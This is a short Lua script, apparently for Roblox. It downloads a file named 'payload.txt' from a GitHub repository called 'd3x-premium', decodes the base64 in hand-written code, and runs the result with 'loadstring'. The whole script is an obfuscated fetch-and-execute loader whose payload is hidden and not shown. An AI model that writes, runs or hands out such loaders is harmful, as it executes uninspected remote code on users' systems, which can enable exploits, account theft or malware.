local raw = game:HttpGet("https://raw.githubusercontent.com/xwwuhq/d3x-premium/main/payload.txt")

local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
raw = raw:gsub('[^'..b..'=]', '')

local decoded = (raw:gsub('.', function(x)
    if x == '=' then return '' end
    local r,f='',(b:find(x)-1)
    for i=6,1,-1 do
        r=r..((f%2^i-f%2^(i-1)>0) and '1' or '0')
    end
    return r
end):gsub('%d%d%d%d%d%d%d%d', function(x)
    local c=0
    for i=1,8 do
        c=c+((x:sub(i,i)=='1') and 2^(8-i) or 0)
    end
    return string.char(c)
end))

loadstring(decoded)()